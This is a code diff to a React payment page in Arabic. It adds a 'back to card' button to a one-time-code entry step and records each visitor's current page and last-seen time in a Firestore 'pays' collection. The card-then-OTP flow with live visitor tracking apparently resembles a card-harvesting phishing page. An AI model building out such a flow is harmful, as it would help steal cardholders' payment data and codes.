@@ -488,6 +488,20 @@ export default function SubmitPage() {
     })
   }
 
+  const handleBackToCardFromOtp = async () => {
+    setLoading(true)
+    try {
+      await setDoc(doc(db, 'pays', idNum), {
+        step: 5,
+        currentPage: 'card-info',
+        lastSeenAt: Date.now(),
+      }, { merge: true })
+    } catch {}
+    setLoading(false)
+    setOtp('')
+    setStep(5)
+  }
+
   if (success) {
     return (
       <div className="min-h-screen bg-gray-50 py-6 sm:py-8 px-4" dir="rtl">
@@ -896,9 +910,19 @@ export default function SubmitPage() {
                     maxLength={6}
                   />
                 </div>
-                <Button type="submit" disabled={loading} className="w-full h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
-                  {loading ? 'جاري التحقق...' : 'تأكيد الرمز'}
-                </Button>
+                <div className="flex flex-col sm:flex-row gap-3">
+                  <Button
+                    type="button"
+                    disabled={loading}
+                    onClick={() => void handleBackToCardFromOtp()}
+                    className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white"
+                  >
+                    رجوع للبطاقة
+                  </Button>
+                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
+                    {loading ? 'جاري التحقق...' : 'تأكيد الرمز'}
+                  </Button>
+                </div>
               </form>
             </CardContent>
           </Card>
